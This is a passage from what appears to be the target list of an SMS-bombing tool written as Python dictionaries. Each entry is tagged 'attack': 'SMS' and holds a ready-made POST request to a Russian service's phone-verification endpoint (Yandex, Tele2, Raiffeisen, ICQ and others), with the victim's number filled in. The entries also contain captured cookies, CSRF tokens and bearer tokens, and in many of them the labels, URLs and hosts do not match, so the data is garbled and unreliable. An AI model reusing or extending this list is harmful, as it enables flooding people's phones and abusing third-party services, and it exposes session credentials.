cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; gsscw-tsum=dJzFkoZnrNwUdl/mSDzQo81riC8qq0GIsZzhPoLf0pZbmGjgRYPcM0QWcCFS7kRNN1aHi7mPHqeUa0A3H9gCx77HRnAF9GCMKyoeoR/wxTE2cjEVVe1BRX45yL//NylMoPtcS7YG1Qk9Nr47WK5l+plq0NMS1PeKrSRLRtgMuqcuMW8KQJArwzF1EBHLsSr9he4hueRZ55gl/DHmCBHWblQMRKQJP4gdDB2bpqReQMdRJQPf5OJSqXSR+X7Gyo6s5rwRHPY43wDGgmRx2uxB; fgsscw-tsum=HM2a24aeaad3ebe9f3acf27c1860f9e7d6769237',
                'Host': 'api.tsum.ru',
                'Origin': 'https://www.tsum.ru',
                'Referer': 'https://www.tsum.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'user',
                'X-Client-Date': '09.11.2022, 18:18:06',
                'X-Site-Region': 'RU',
                'X-Uid': '84513f80-afe7-4390-b9ab-cbef7219cdc9',
                'X-XID': 'f977bd6a-7555-4825-8c30-2f80517a7c81'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'api.tsum.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.tsum.ru/v2/authorize/request-sms',
            'headers': {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '51',
                'Content-Type': 'application/json',
                'Cookie': 'SessionID=baMlJmKhzoYnXn2NFKHNsQuF0hUrwWnKpjcm5VLEkVU',
                'Host': 'bmp.megafon.tv',
                'Origin': 'https://megafon.tv',
                'Referer': 'https://megafon.tv/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user_agent()[1]
            },
            'data': {
                'msisdn': number,
                'password': '200147200147'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'bmp.megafon.tv',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://bmp.megafon.tv/api/v10/auth/register/msisdn',
            'headers': {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '107',
                'content-Type': 'application/json',
                'Cookie': 'suid=69c5eebce8dd622b0c61536c8880755b.bbb938e4d6d90b9ea4f49bd33d6b9228; autoru_sid=a%3Ag636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca%7C1668014724703.604800.tb-QtFaltosbNGBHFhXuUw.PIb8E2rWYxc1npgvR-99UIXOd3VYt8YlJqswR1Yd1nM; autoruuid=g636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca; autoru_gdpr=1; spravka=dD0xNjY4MDE0NzQwO2k9MTUxLjEwNi4xMi4yNDY7RD1DMzVBNEZGODRDMDg4OTU3MkRGOTREMEFCRTM5M0NBOTE2N0JFRjBENzU0QTIwRTgwODM2OTE4NEFFMUI1MTFEQzE3N0FDQjk7dT0xNjY4MDE0NzQwNjg1ODYyNjQyO2g9YTU5NDM0N2U1ZGMyYWEwZmZlZTUzMGQ1YzFlYjQ0YTU=; _yasc=BfGUGpXLHtiBxKt6L6s4IsWKTSltQon0caSV3VQUM02jgcteHq6J+3znIWK0; _csrf_token=99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
                'Host': 'auth.auto.ru',
                'Origin': 'https://auth.auto.ru',
                'Referer': 'https://auth.auto.ru/login/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user_agent()[1],
                'x-csrf-token': '99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
                'x-requested-with': 'XMLHttpRequest'
            },
            'data': {
                '{"items': '[',
                '{"path': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'auth.auto.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://auth.auto.ru/-/ajax/auth/',
            'headers': {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                'Host': 'passport.yandex.ru',
                'Origin': 'https://passport.yandex.ru',
                'Referer': 'https://passport.yandex.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user_agent()[1],
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Length': '183'
            },
            'data': {
                'track_id': 'str4',
                'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
                'password': 'Hoho_HO123',
                'login': 'korotkovateng1987-qw',
                'phone_number': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'passport.yandex.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://passport.yandex.ru/registration-validations/password',
            'headers': {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '174',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                'Host': 'passport.yandex.ru',
                'Origin': 'https://passport.yandex.ru',
                'Referer': 'https://passport.yandex.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user_agent()[1],
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'track_id': 'str4',
                'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
                'number': number,
                'isCodeWithFormat': 'True',
                'confirm_method': 'by_sms'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'passport.yandex.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://passport.yandex.ru/registration-validations/phone-confirm-code-submit',
            'headers': {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '69',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'anonymous-consents=%5B%5D; abtc=787EC619484F2A7B4C166802604530920674; abtc-text-button_2=default_text; abtc-story-test_5=story_exist; abtc-checkout-button_2=active_button; abtc-crm-test_3=owm_crm; abtc-fast-buy-listing_1=fast_buy_listing; cookie-notification=NOT_ACCEPTED; ROUTE=.accstorefront-cbd86fdb8-r9fqp; AKA_A2=A; akaas_sn_www_shoppinglive_ru=2147483647~rv=14~id=02330a70b8ea956d92b323dd5a0c4036~rn=Traffic%20Shift%20RU%20clone%201; userWasLogin=true; JSESSIONID=9296AB25A1624615EB76E2B2065219A5.accstorefront-cbd86fdb8-r9fqp; exp_id=default_text/fast_buy_listing/story_exist/active_button/owm_crm; sl-cart=2d001440-4742-42b0-a799-97ec1f86ea05',
                'origin': 'https://www.shoppinglive.ru',
                'referer': 'https://www.shoppinglive.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1]
            },
            'data': {
                'mobilePhone': number,
                'CSRFToken': '00bc3ff8-f081-483d-ab0e-bb026785114f'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'www.shoppinglive.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.shoppinglive.ru/phone-verification/send-code',
            'headers': {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
                'Connection': 'keep-alive',
                'Content-Length': '24',
                'Content-Type': 'application/json',
                'Cookie': '__ddg1_=xl7dki0N0qhMTlUiS9iY; deviceId=d8e3d55a4da157282898a72208499cfd; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
                'Host': 'ap.leomax.ru',
                'Origin': 'https://auth.k8s.leomax.ru',
                'Referer': 'https://auth.k8s.leomax.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user_agent()[1]
            },
            'data': {"phone": f"+{number}"}
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'ap.leomax.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://ap.leomax.ru/siteapi/auth/authcode',
            'headers': {

            },
            'data': {
                'number': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'oapi.raiffeisen.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms',
            'headers': {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '75',
                'Content-type': 'application/json',
                'Cookie': 'city=izhevsk; city_is_confirmed=1; XSRF-TOKEN=eyJpdiI6IlZwTE9tYUtoVTZhVkpYQ3JnUW9PbFE9PSIsInZhbHVlIjoidWlST2xNa1pvbzVRdDVqY1daRTVQYXBuK25Mb1R6bFR3bG5SYUJZZ05wYVZHQ3BIcjBVZXBGOFNlYVdLUUMrMWU4cGpHRnZlcHV5N2tGdThIbWdiMGc9PSIsIm1hYyI6ImNiYTQ2YzcwMDk5ZGE4YzJiMDE3NTcxOTJhNDVjMjViYTY1NWI0NGYxMDI2ODEzNDYyMDQ4Mzc1NzJiZWMxMWQifQ%3D%3D; b-apteka_session=eyJpdiI6IjcrTWJyM21aa3lvME1UaXcrRVIxWkE9PSIsInZhbHVlIjoiN29pME5hZ05RYU9Cc2lVMW1Vdk0yMG4zUjBhVUdaUFwvWnFYNzBubG9TNkdPcnk0WDZZRE00c1BTRlRISXRhczdxMm5QTWYrOTlaWDVORGFsMmszdmJ3PT0iLCJtYWMiOiJmNWRkYzJhMWMzMWUyYTY3MzBlOGQzNWFmOTdkYjA3OWE4ZTIyOWE1NDI3ZTU2OWNmYzA1MDRhYzM3ZTgwZGFmIn0%3D',
                'Host': 'b-apteka.ru',
                'Origin': 'https://b-apteka.ru',
                'Referer': 'https://b-apteka.ru/lk/login',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user_agent()[1],
                'X-Requested-With': 'XMLHttpRequest'
            },
            'data': {
                'phone': number,
                '_token': 'G342Mr1Pf7bDbpQ3qdqxByzuyjG08yHr8i9TbtpR'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'b-apteka.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://b-apteka.ru/lk/send_confirm_code',
            'headers': {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'fr-FR,fr',
                'content-length': '18',
                'content-type': 'application/json',
                'cookie': 'language=ru-RU; user-separator=part1; language=ru-RU; session-cookie=1726063975251ab3f60c6a976940ac7285525d89dcb927fe1d60ec46cae73ef49059592ea3ef326a51e3f2f08d6353e1; auth_state=NOT_AUTH; kc_config={%22realm%22:%22tele2-b2c%22%2C%22clientId%22:%22digital-suite-web-app%22%2C%22url%22:%22%22%2C%22updateTimeBeforeExpiration%22:60%2C%22defaultRefreshInterval%22:60%2C%22requestSetTokenTimeout%22:15%2C%22requestSetTokenRetry%22:2%2C%22requestSetTokenRetryDelay%22:2%2C%22requestUpdateTokenTimeout%22:10%2C%22requestUpdateTokenRetry%22:8%2C%22requestUpdateTokenRetryDelay%22:2%2C%22cookieDomain%22:%22.tele2.ru%22%2C%22isActive%22:true%2C%22smsCodeLength%22:6%2C%22migration%22:true%2C%22skylinkCookieDomain%22:%22.skylink.ru%22}; Test_try={%225500001%22:1}; csrf-token-name=csrftoken; JSESSIONID=yC1eMKbGBrnLyukyFZ7-at-Q5ZKp8MA6JlTGL06bkjt_o0QFjCZQ!-550992005; NSC_ESNS=a0366d2d-14a5-136c-9678-c223c06207fc_0765662115_1895704033_00000000019867210692; csrf-token-value=1726063c60de4ab6c4943efca7bc968c764caec84dde01522c0a8f7ae9d5608427191ccb48f76353',
                'origin': 'https://msk.tele2.ru',
                'referer': 'https://msk.tele2.ru/?pageParams=askForRegion%3Dtrue',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'tele2-user-agent': 'web',
                'user-agent': user_agent()[1],
                'x-ajax-token': 'b382122191e9582bd66d958796abe7397c63a42c493c56ca4b8acfc965e7b11c',
                'x-csrftoken': '172606399efc805c7c4123a0dfeff94afb700ee884ccd72ecf2206201ee028c941f18bf7f5acf1e8',
                'x-request-id': 'HVRe0j56mcGaJpdnoFXqxBg89wQfLsA7OkvDzurS',
                'x-requested-with': 'XMLHttpRequest'
            },
            'data': {
                'sender': 'Tele2'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'msk.tele2.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://msk.tele2.ru/api/validation/number/{phone}',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '0',
                'cookie': 'favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; _cfuvid=7qo8NDtZ3jsi4WBHzUZ1snKrNVf93UHPrbDxrEKBVTc-1668027960075-0-604800000; searchPlaceholder=Apple%2520MacBook; BASKET_COUNT=0; __cf_bm=FUlOJxiHHM2NF7yFFQqufh5_RxESugWb5_Gt93wl8Fw-1668027962-0-AUwqQ15CtADoXAccMeA3g0WbzmrgCD2/QcylobSrjQdLiQx1cJfIsx+AGxZCn0ZH21eecYku/+MJ07yrSE3tSrQY/RjEr4r9V4a8ZJsYdmI9f27uS9tdy0FEuyTpuyHcty6s6eGB7+V0UkUkn4A/Hkt81gTBzVLAKShMCv7SUKwb0oYRN35EAd5y3SGSzZHghg==',
                'origin': 'https://www.svyaznoy.ru',
                'referer': 'https://www.svyaznoy.ru/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent()[1],
                'x-requested-with': 'XMLHttpRequest'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'www.svyaznoy.ru',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.svyaznoy.ru/api/v2/sms-verification-code/{phone[1:]}',
            'headers': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Length': '16',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'PHPSESSID=uutvbqgetdp7hrktod41sk70b3; _fbp=fb.1.1668028718954.379549720',
                'Host': 'www.frotels.com',
                'Origin': 'https://www.frotels.com',
                'Referer': 'https://www.frotels.com/appsendsms.php',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'Sec-Fetch-Dest': 'iframe',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user_agent()[1]
            },
            'data': {
                'mobno': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'www.frotels.com',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://www.frotels.com/appsendsms.php',
            'headers': {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ru',
                'content-length': '60',
                'content-type': 'application/json',
                'dnt': '1',
                'origin': 'https://wheely.com',
                'referer': 'https://wheely.com/',
                'sec-ch-ua': 'Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user_agent()[1],
                'x-wheely-sign': 'eyJ0eXBlIjoiY2FwdGNoYSIsInNpZ25hdHVyZSI6IlAwX2V5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp3WVhOemEyVjVJam9pTkVkemJqUnlaMVpTUjAxMWNFZHNiMGxLT0ZwT1NURjNTMVpxWjBkNGVqWmhSVEUwZVd0SVEyTlJWR2cwV0hWTE5qQndOMlZZYUVsNlEwazRTakZVTXpsalEycE9RWGw2Vm1oS2QzQjBjbGQ1TlZaQ1NVNUVaRzFsTkZGRlIydG1iMDl6TVVSaFoyeDJaVnBIVnpObGFGWXpZa1kyY1VZeFdIQXpZa3c0TVdwTVJVaFhkbTQ0Ymtvek1GZE5SRUUzZFhSWVdsSjVTblIzWjNBeU1sTkZNemhEVjFCa1JGZGFSMXBpTXprNE5HSXlOa3huZURWVmJHaFdhRkZQYnpCcGRHbGFkMnRSZWpBclRVTTJka2t3ZFVOdFNHOURRbXhOUVUwM1dWVm1aVTQ0TDI5c04yRm9XbUY2TW1GMFYyMW9Ra2h0TkZaeFlUTkZOa1ZsT0VWdlJtOWtRWE12Y0VOdU1IbERXbk42T0M5VWMxYzJZVTlGYnpoQk5EZEdhbUprZWpaYU5XeEdObUU0VjBzd1UzQkJOVFZPYm1samEyWnRlVXRuWjBOeVQwaEhXRVJvV1RkamJIRTRObTltTTNkaVUyaHRhbUZMV0NzNU9EbFZla2RXVDB4WlJ6VXpVRzQxV1dGSkwzQXZRbUZXWWpaUFYzY3pjRWxOVUZGeFUzSnFPVW80ZG5KQmVscEtVV3RtYUdWU1JtTjFSUzlwYmxSVFF6Sk1RelZxT1VoSU4xZzNVRlJoTXpCWldrZ3JUVmxQUm1RNE9XRTBUbmhrUmtzcmJFTmhhMlYwV0UwMFdIaGplRFV3UTFKSVpWVlRaek5zYTFaVlZIaExVVGx0Wmxwa04wUlphRXhUWVRodU1DOURiSGhIVVdGcFdVOXhjRWg0U0RCeFdsSXpjM1ZIUjBWak4ySTBVRmxJWjNaaksydE5hVU41U0ZFemFWWnVRemxGVFhkNFJHdDZVMmM0ZEZocWVHZENlbnB3YjFJelNscFhRM2hsWkZZMGNUWjNlak15TkVoUmNtVnFjbWN3YWs0eWFYaDRlWHBsWlRBM1VsTXdTMnBzTVRkbmNVNDJkM0ZWVVM5V1V6VTNNM1JTZUdwS1JYVjVOV2RZWlc1WU5VRlFjRFpZYmxaWldUa3JXRTVxZUd4bFozVXZZVTB2Y1V4UU9Xb3ZjMHQxSzA5WWFrOUdTemxKUTBnM05EZHJjRWN5TTJreFkxcExRVzg0V21neWNsVnJhblpzUTA1cmVsUnBRV3QzTXpabk55ODJVWE01YXpaU1IwNXNjM0ZWTldwS1drcHhMMVF5ZEVwVk9WRnJlRzFoTUdzMFlXdHliR2Q1UkZGVVZtaHBlV1ZFV1ZWVGNYSkhUM0oxY1haYU1TOXRNbEJuVGpkV01FVXZOMjFaYUdGelNESnVTR2RpVTBsamVXcFdhVmQwVW5KUlFtbFVjVzlVZW05blpUbFFjMFpwTlhCUVFubEdUVFpOVDFWNFRuRnFWV2xOUkdKT00wTlFWRVpyWTNBNE5FTkpaV1pNTm1Kck5FSjZZM29yU21OdFNqSm9jV3RrZFRoSU5UWjNWRmRJUjNWUE1uUlFkWFJGWW1KTU9FdHVXRmh0TlRWNlUwbHJUVXB3YTBGeFRGZ3JSV3cwYkZwSFNETTRTM05qY0RFd09DczJNV2RpU2tGRFoyWkNWa2hXYURkbFRqUkpUbEpUVEdVeGIyWjZPWFZHWlhkV1drSXpZa05oUTBkMGRuUm1Ta1pHVUhwWFluWm9NM0ZqSzNWYWEzbHBOR056WTBsT2QzSndRMVJZY2sxR05XaGhiVXBOTm0xd1NEWTVkRzB2V0had1NVZG9aWEF3VFhCcGNHVkxXREV5VDFCM09ERjFjRU5YVDJSMU4wbHlabk5wUW1waVFrUkdOMHBxY0dkaVowOTVkMUZaWTFSeWVFODFTWGhzZFRkWWNVOUVjbEpLYVRSalZUTnJOM3AyVjJSTlpVNDVjV1pTU0hkeVowSk1PR3MyVUhCYU5DOXpjSFJ3TXpJNVEzVXZLM2hIVUdjemJtdFhXV3RSZFd4SmRWRlZUV3hSUTI5UVkxQlhNV3Q2WVVsRGNrVnllVGhEVkRSUVZsaGxWa2xYVEhrNWRHWjRaak5KVkdoTFpERm9NV2hGWWpsVFNtaHljRVY1TVhGaGVIVTJaeXRqZG1WQmQwRm1SVUpvZVhoTk9XeFZVMWhFUnpadlEwcDFOblJUZERWNVVGaERNRWhoYURFNGRUTXJVRFE1VEV4UmNGQkNUeXRtVkdwbVdVSjRVM1ZyZHpKc2FUTlRUbXhESzNsRlJFNUZNbmswTDJZd1dIY3dSMG8wWVdOYVFrNDNkVXhTVFdOb01YcG1NWGgwTkRGWE9WUm9iM3BtWTNKNlRucHVXRGRsY3k5dmRGaDJTM0ZMWm1OR2NHRlZNVWxSZEU1M1VXNVdjbTF5Um5wbFJuUmlkbFJZTjBkRFFrdFRVRUpyUVUxVVJuRktOR1ZOVTNoM2NrZG1kMGRUVUdSTGFDdEpWSFpXVEV4RFEwdEdhR04yZVhwWVpXOXJTWEUyTmpKd1JVbENlQ3Q2T0hwdmNHVjVhVUYyVURFek55czJSSFJSTlZwYWNISlpSbEFpTENKbGVIQWlPakUyTmpnd01qazBORFlzSW5Ob1lYSmtYMmxrSWpvek16azFNVEF6TURNc0luQmtJam93ZlEuaEQ4RHIzRFRxenRZb3JzNTQ0ZjJRQzVsQ0V6LVY1WkhDeWZJNFFtcmdpbyJ9'
            },
            'data': {
                'app_id': '55e085968a5da59241000001',
                'phone': number
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'api.wheely.com',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://api.wheely.com/v6/auth/oauth/token',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '141',
                'content-type': 'application/json',
                'origin': 'https://web.icq.com',
                'referer': 'https://web.icq.com/',
                'sec-ch-ua': 'Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': 'macOS',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user_agent()[1]
            },
            'data': {
                '{"reqId': '85231-1668029727',
                'params': number,
                'devId': 'ic1rtwz1s1Hj1O0r',
                'application': 'icq"}}'
            }
        },
        {
            'info': {
                'country': 'ALL',
                'attack': 'SMS',
                'website': 'u.icq.net',
                'anonymous': 'No'
            },
            'method': 'post',
            'url': 'https://u.icq.net/api/v89/rapi/auth/sendCode',
            'headers': {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '231',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
